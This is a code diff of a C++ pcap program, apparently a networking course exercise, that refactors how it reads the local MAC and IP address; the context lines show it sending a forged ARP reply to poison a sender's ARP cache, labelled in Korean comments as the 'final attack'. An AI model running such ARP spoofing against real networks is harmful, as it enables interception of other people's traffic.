@@ -11,8 +11,7 @@
 #include "ethhdr.h"
 #include "arphdr.h"
 
-Mac getmymac(char *dev);
-Ip getmyIP(char *dev);
+void get_mydevice(char* dev, Mac* mymac, Ip* myip);
 void send_arp_packet(Mac packet_eth_dmac, Mac packet_eth_smac, int arphdr_option, Mac packet_arp_smac, Ip packet_arp_sip, Mac packet_arp_tmac, Ip packet_arp_tip, pcap_t *handle);
 Mac get_sender_mac(pcap_t* handle);
 
@@ -60,16 +59,19 @@ int main(int argc, char *argv[])
    Mac unknown = Mac::nullMac(); 
    sender_IP = Ip(std::string(argv[2]));   
    target_IP = Ip(std::string(argv[3]));
+
    //내 맥, 아이피 알아내기
-   mymac = getmymac(dev);
+   get_mydevice(dev, &mymac, &myIP);
    printf("My Mac: %s\n", std::string(mymac).data());
-   myIP = getmyIP(dev);
    printf("My IP : %s\n", std::string(myIP).data());
+
    //상대 ip주소 활용해서 arp 보내기
    send_arp_packet(broad, mymac, 1, mymac, myIP, unknown, sender_IP, handle);
+
    //패킷 받아서 센더의 맥어드레스 알아내기
    sender_mac = get_sender_mac(handle);
    printf("Sender Mac: %s\n", std::string(sender_mac).data());
+
    //알아낸 정보들로 최종 공격하기
    send_arp_packet(sender_mac, mymac, 2, mymac, target_IP, sender_mac, sender_IP, handle);
    //edit
@@ -80,14 +82,11 @@ int main(int argc, char *argv[])
 
 }
 
-Mac getmymac(char *dev)
+void get_mydevice(char* dev, Mac* mymac, Ip* myip)
 {
    int fd;
    struct ifreq ifr;
    const char *iface = dev;
-   Mac mac;
-   char *mac2 = NULL;
-
    memset(&ifr, 0, sizeof(ifr));
 
    fd = socket(AF_INET, SOCK_DGRAM, 0);
@@ -97,31 +96,15 @@ Mac getmymac(char *dev)
 
    if (0 == ioctl(fd, SIOCGIFHWADDR, &ifr))
    {
-      mac = Mac((uint8_t* )ifr.ifr_hwaddr.sa_data);
+      *mymac = Mac((uint8_t* )ifr.ifr_hwaddr.sa_data);
    }
-  
-   close(fd);
-   return mac;
-}
 
-Ip getmyIP(char *dev)
-{
-   int fd;
-   struct ifreq ifr;
-   Ip ip;
-   
-   fd = socket(AF_INET, SOCK_DGRAM, 0);
-	ifr.ifr_addr.sa_family = AF_INET;
-	memcpy(ifr.ifr_name, dev, IFNAMSIZ -1);
-   ioctl(fd, SIOCGIFADDR, &ifr);
-   ip = Ip(std::string(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr)));
-   #ifdef IPtest
-   char* testip;
-   strcpy(testip, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
-   printf("[MY IP ADDR = %s]\n", testip);
-   #endif //IPtest
-   close(fd);  
-   return ip;
+   if (0 == ioctl(fd, SIOCGIFADDR, &ifr))
+   {
+      *myip = Ip(std::string(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr)));
+   }
+   close(fd);
+   return;
 }
 
 void send_arp_packet(Mac packet_eth_dmac, Mac packet_eth_smac, int arphdr_option, Mac packet_arp_smac, Ip packet_arp_sip, Mac packet_arp_tmac, Ip packet_arp_tip, pcap_t *handle)
